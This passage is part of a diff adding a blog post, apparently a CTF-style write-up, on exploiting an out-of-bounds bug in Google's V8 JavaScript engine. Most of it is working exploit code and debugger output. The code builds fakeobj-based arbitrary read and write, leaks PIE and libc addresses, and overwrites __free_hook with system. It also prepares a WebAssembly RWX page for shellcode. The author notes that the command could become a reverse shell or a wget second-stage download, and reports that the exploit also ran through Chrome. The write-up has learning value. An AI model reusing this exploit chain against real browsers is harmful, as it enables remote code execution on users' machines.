+    <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Return the object</span>
+    <span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="getting-arbitrary-read--write">Getting arbitrary read / write</h2>
+
+<p>We have the <code class="highlighter-rouge">addrof</code> and <code class="highlighter-rouge">fakeobj</code> primitives now. From here, the arbitrary read primitive is easy, but the arbitrary write primitive requires a little bit more work. Let’s start with the arbitrary read primitive.</p>
+
+<p>In order to perform arbitrary reads, what we need to do is create a float array with four elements where the 0th index is set to a value of a float array’s map. That way, if we place a fake object right on top of where that map is, the 2th index of the float array will be treated as the fake object’s <code class="highlighter-rouge">elements</code> pointer. This can then be used to perform reads at arbitrary addresses. Here is an example:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; var a = [1.1, 1.2, 1.3, 1.4];
+undefined
+d8&gt; %DebugPrint(a);
+0x18eaf2e4ddb1 &lt;JSArray[4]&gt;
+[1.1, 1.2, 1.3, 1.4]
+
+10gx 0x18eaf2e4ddb1-1-0x30
+0x18eaf2e4dd80:	0x000036946f4814f9	0x0000000400000000 &lt;- FixedDoubleArray
+0x18eaf2e4dd90:	0x3ff199999999999a	0x3ff3333333333333
+0x18eaf2e4dda0:	0x3ff4cccccccccccd	0x3ff6666666666666
+0x18eaf2e4ddb0:	0x0000265b96342ed9	0x000036946f480c71 &lt;- JSArray
+0x18eaf2e4ddc0:	0x000018eaf2e4dd81	0x0000000400000000
+
+elements == 0x000018eaf2e4dd81
+index 0 == 0x18eaf2e4dd90 == elements + 0x10 (ignoring the last bit)
+
+Assume we put a fake object at 0x18eaf2e4dd90. 
+
+If we set index 0 to the float array's map, then index 2 (at 0x18eaf2e4dda0)
+will be treated as the elements pointer for our fake object.
+
+We can then read fake_object[0], and it will read whatever value is at
+elements + 0x10
+</code></pre></div></div>
+
+<p>Here is an actual worked example, using our <code class="highlighter-rouge">fakeobj</code> primitive from before:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; var a = [1.1, 1.2, 1.3, 1.4];
+undefined
+d8&gt; var float_arr = [1.1, 1.2, 1.3, 1.4];
+undefined
+d8&gt; var float_arr_map = float_arr.oob();
+undefined
+d8&gt; var crafted_arr = [float_arr_map, 1.2, 1.3, 1.4];
+undefined
+d8&gt; "0x"+addrof(crafted_arr).toString(16);
+"0x7be69511d69"
+
+Right now, this is what it looks like in memory, the JSArray elements pointer
+points to the FixedDoubleArray:
+
+gef➤  x/10gx 0x7be69511d69-0x30-1
+0x7be69511d38:	0x000016d74fa414f9	0x0000000400000000 &lt;- FixedDoubleArray
+0x7be69511d48:	0x000031adb41c2ed9	0x3ff3333333333333 &lt;- We want our fake object here
+0x7be69511d58:	0x3ff4cccccccccccd	0x3ff6666666666666
+0x7be69511d68:	0x000031adb41c2ed9	0x000016d74fa40c71 &lt;- JSArray
+0x7be69511d78:	0x000007be69511d39	0x0000000400000000
+
+Right now, if we place a fake object at 0x7be69511d48, we can control the value at
+0x7be69511d58 (index 2 of crafted_arr), which would be the fake object's elements pointer. 
+This only works because we set the Map to be that of a float array (index 0 of crafted_arr). 
+A different object map would not work here as it may not treat the value at 0x7be69511d58 as 
+the elements pointer.
+
+d8&gt; var fake = fakeobj(addrof(crafted_arr)-0x20n);
+undefined
+d8&gt; crafted_arr[2] = itof(BigInt(0x7be69511d38)-0x10n+1n);
+4.206668633923e-311
+d8&gt; "0x"+ftoi(fake[0]).toString(16);
+0x16d74fa414f9
+
+As seen, we have successfully read the value at our arbitrary address of 0x7be69511d38
+</code></pre></div></div>
+
+<p>This is how we can use our <code class="highlighter-rouge">fakeobj</code> primitive to get an arbitrary read. In the same way, we can get an arbitrary write, however this won’t exactly work out of the box, so lets call the arbitrary write function <code class="highlighter-rouge">initial_arb_write</code> instead:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// This array is what we will use to read from and write to arbitrary memory addresses</span>
+<span class="kd">var</span> <span class="nx">arb_rw_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Controlled float array: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// We have to use tagged pointers for reading, so we tag the addr</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
+
+    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map</span>
+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
+
+    <span class="c1">// Change the elements pointer using our crafted array to read_addr-0x10</span>
+    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
+
+    <span class="c1">// Index 0 will then return the value at read_addr</span>
+    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map</span>
+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
+
+    <span class="c1">// Change the elements pointer using our crafted array to write_addr-0x10</span>
+    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
+
+    <span class="c1">// Write to index 0 as a floating point value</span>
+    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So why wouldn’t the arbitrary write work? I don’t exactly know why, but it just doesn’t work with some certain addresses (if someone could explain to me why this is the case, I’d be grateful. Please DM me on twitter).</p>
+
+<p>Let’s take an example:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  p &amp;__free_hook
+$1 = (void (**)(void *, const void *)) 0x7f5c5ecf58e8 &lt;__free_hook&gt;
+gef➤  p &amp;system
+$2 = (int (*)(const char *)) 0x7f5c5e957440 &lt;__libc_system&gt;
+gef➤  c
+Continuing.
+
+d8&gt; initial_arb_write(0x7f5c5ecf58e8, 0x7f5c5e957440);
+
+&lt;Program segfaults right here&gt;
+</code></pre></div></div>
+
+<p>Now, I don’t exactly know why this occurs, and I haven’t found an explanation when I looked online. However, I do know that the real way to get an arbitrary write primitive is to overwrite the backing store of an <code class="highlighter-rouge">ArrayBuffer</code> with the address you want to write to. Then, using a <code class="highlighter-rouge">DataView</code> object to write to the <code class="highlighter-rouge">ArrayBuffer</code> will write to your overwritten address. If you’ve never coded in JavaScript before (like me), the MDN documentation for <code class="highlighter-rouge">ArrayBuffer</code> and <code class="highlighter-rouge">DataView</code> explains how to use them together.</p>
+
+<p>The backing store of an <code class="highlighter-rouge">ArrayBuffer</code> can be thought of as the same as the <code class="highlighter-rouge">elements</code> pointer of a <code class="highlighter-rouge">JSArray</code>. It is found at offset <code class="highlighter-rouge">&amp;ArrayBuffer+0x20</code>, which you can find out by using the x64.debug version of <code class="highlighter-rouge">d8</code>. The idea is that instead of using a <code class="highlighter-rouge">fakeobj</code> to write directly to an arbitrary address, we use the <code class="highlighter-rouge">fakeobj</code> to do our <code class="highlighter-rouge">initial_arb_write</code> and modify the backing store of a legitimate <code class="highlighter-rouge">ArrayBuffer</code> to our arbitrary address. Following this, we can use <code class="highlighter-rouge">dataview.setBigUint64(0, val, true)</code> to write our <code class="highlighter-rouge">val</code> as a little-endian 64 bit value to our arbitrary address. This is shown below:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  p &amp;__free_hook
+$3 = (void (**)(void *, const void *)) 0x7fb610ed08e8 &lt;__free_hook&gt;
+gef➤  p &amp;system
+$4 = (int (*)(const char *)) 0x7fb610b32440 &lt;__libc_system&gt;
+gef➤  c
+
+d8&gt; var buf = new ArrayBuffer(8);
+undefined
+d8&gt; var dataview = new DataView(buf);
+undefined
+d8&gt; var buf_addr = addrof(buf);
+undefined
+d8&gt; var backing_store_addr = buf_addr+0x20n
+undefined
+
+// Overwrite backing store to &amp;__free_hook
+d8&gt; initial_arb_write(backing_store_addr, 0x7fb610ed08e8);
+undefined
+d8&gt; dataview.setBigUint64(0, BigInt(0x7fb610b32440), true);
+undefined
+sh: 1: undefined: not found
+
+gef➤  x/gx &amp;__free_hook
+0x7fb610ed08e8 &lt;__free_hook&gt;:	0x00007fb610b32440
+</code></pre></div></div>
+
+<p>As you can see, we have successfully overwritten <code class="highlighter-rouge">__free_hook</code> with <code class="highlighter-rouge">&amp;system</code>. We can chuck this whole thing into a function now as well:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
+    <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
+    <span class="nx">dataview</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="exploitation-technique-1-overwrite-__free_hook-to-system">Exploitation Technique 1: Overwrite <code class="highlighter-rouge">__free_hook</code> to <code class="highlighter-rouge">system</code></h2>
+
+<p>The first way we can get arbitrary code execution is to overwrite <code class="highlighter-rouge">__free_hook</code> with <code class="highlighter-rouge">system</code> (as shown above). Then, if we do something as simple as <code class="highlighter-rouge">console.log("xcalc");</code>, it will allocate some memory for the string <code class="highlighter-rouge">"xcalc"</code> and then free it, which will cause a call to <code class="highlighter-rouge">system("xcalc");</code>, thus popping calc.</p>
+
+<p>To do this though, we need some leaks. Note that I am on Ubuntu 18.04.3 LTS, so my offsets for leaks will be different to yours. This is simply the same as Linux userspace exploitation now, so I won’t go into too much detail.</p>
+
+<p>What I noticed (through rigorous trial and error) was that if you allocate a native <code class="highlighter-rouge">JSArray</code> and leak it’s Map, the Map points to an address in an mmapped region of memory. Near the base of this mmapped region of memory lies a heap pointer, and this heap pointer points to a PIE address. This way, we can get a PIE leak, get the PIE base address, and then get the Libc base address by using the global offset table, as follows:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">([</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">]);</span>
+
+<span class="kd">var</span> <span class="nx">test_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">test</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">map_ptr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">test_addr</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">map_sec_base</span> <span class="o">=</span> <span class="nx">map_ptr</span> <span class="o">-</span> <span class="mh">0x2f79</span><span class="nx">n</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">heap_ptr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">map_sec_base</span> <span class="o">+</span> <span class="mh">0x18</span><span class="nx">n</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">PIE_leak</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">heap_ptr</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">PIE_base</span> <span class="o">=</span> <span class="nx">PIE_leak</span> <span class="o">-</span> <span class="mh">0xd87ea8</span><span class="nx">n</span><span class="p">;</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] test array: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">test_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] test array map leak: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">map_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] map section base: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">map_sec_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] heap leak: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">heap_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] PIE leak: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">PIE_leak</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] PIE base: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">PIE_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="nx">puts_got</span> <span class="o">=</span> <span class="nx">PIE_base</span> <span class="o">+</span> <span class="mh">0xd9a3b8</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">libc_base</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">puts_got</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x809c0</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">free_hook</span> <span class="o">=</span> <span class="nx">libc_base</span> <span class="o">+</span> <span class="mh">0x3ed8e8</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">system</span> <span class="o">=</span> <span class="nx">libc_base</span> <span class="o">+</span> <span class="mh">0x4f440</span><span class="nx">n</span><span class="p">;</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Libc base: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">libc_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] __free_hook: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">free_hook</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] system: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">system</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>Next, we just overwrite <code class="highlighter-rouge">__free_hook</code> with <code class="highlighter-rouge">&amp;system</code> and call <code class="highlighter-rouge">console.log("xcalc")</code>. You can replace <code class="highlighter-rouge">"xcalc"</code> with anything, such as a reverse shell, or a call <code class="highlighter-rouge">wget</code> to download a second stage payload to perform a sandbox escape, etc.</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Overwriting __free_hook to &amp;system</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">arb_write</span><span class="p">(</span><span class="nx">free_hook</span><span class="p">,</span> <span class="nx">system</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">xcalc</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="/images/oob-v8/calc_popped_free_hook.png" alt="Popping calc using __free_hook" /></p>
+
+<p>You can find the final exploit script at the end of this blog post.</p>
+
+<h2 id="exploitation-technique-2-use-webassembly-to-create-an-rwx-page">Exploitation Technique 2: Use WebAssembly to create an RWX page</h2>
+
+<p>Although the previous technique works well, it is very CTF like, usually used to read a single flag file, or etc, and only works on UNIX style machines. If we could somehow execute our own shellcode, it would give us much more control over the code that we can execute. It will also let us target multiple operating systems simply by just changing the shellcode.</p>
+
+<p><strong>Update</strong>: As a side note, now that I’ve gotten my exploit to work through Chrome, it seems like the WebAssembly route is more reliable than the <code class="highlighter-rouge">__free_hook</code> route. The <code class="highlighter-rouge">__free_hook</code> route just does not want to work through Chrome. I suspect it is because of the way I leaked the addresses. Perhaps when ran through chrome, the leaks just don’t exist at those offsets anymore. I’d investigate further but it is really hard to debug with the Chrome binary. Maybe I’ll do it at a later date and update this writeup.</p>
+
+<p>With other browsers like Firefox and Safari, you can cause a function to become “hot” and get JIT compiled, which results in the creation of an RWX JIT page which you can overwrite with your own shellcode. However, in Chrome, this exploitation technique was mitigated in early 2018. JIT pages are switched between RW and RX as required. They are never RWX.</p>
+
+<p>The only other way (that I know of) to get an RWX page in v8 is to use WebAssembly. If you create a wasm function, it will allocate an RWX page whose address can be leaked. Let’s first create a wasm page. Note that the wasm code used doesn’t matter so long as it compiles and creates an RWX page for us:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://wasdk.github.io/WasmFiddle/</span>
+<span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
+<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Now, checking the memory mappings in GDB, you will see an <code class="highlighter-rouge">rwx</code> page has been created.</p>
+
+<p>In order to figure out how you can leak the address of this page though, you can take the harder route and read the code in <code class="highlighter-rouge">src/compiler/wasm-compiler.cc</code> and the other various files, which is quite time consuming, but good practice to understand how the v8 code base works.</p>
+
+<p>I instead took a shortcut used the x64.debug version to figure this out:</p>
+
+<ol>
+  <li>Since I use <code class="highlighter-rouge">gdb-gef</code>, the first thing I did was take the base address of the RWX region, and do <code class="highlighter-rouge">search-pattern rwx_base_address</code> to see where it occurs in memory.</li>
+  <li>Through a bit of trial and error, I found that if you take <code class="highlighter-rouge">addrof(wasm_instance)</code>, the memory location at which <code class="highlighter-rouge">search-pattern</code> shows the <code class="highlighter-rouge">rwx_base_address</code> is always exactly at <code class="highlighter-rouge">addrof(wasm_instance)-1n+0x88n</code>.</li>
+</ol>
+
+<p>This way, if you just do <code class="highlighter-rouge">arb_read(addrof(wasm_instance)-1n+0x88n)</code>, it will give you the base address of the RWX page, as shown below:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="nx">n</span><span class="o">+</span><span class="mh">0x88</span><span class="nx">n</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] RWX Wasm page addr: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">rwx_page_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>Following this, I just had to copy my shellcode to the RWX page, and just call the wasm function by doing <code class="highlighter-rouge">f();</code>. I decided to use the following shellcode from <a href="https://xz.aliyun.com/t/5003">here</a> that pops xcalc on Linux. I also wrote a helper function to help copy it over to the RWX page:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
+    <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// https://xz.aliyun.com/t/5003</span>
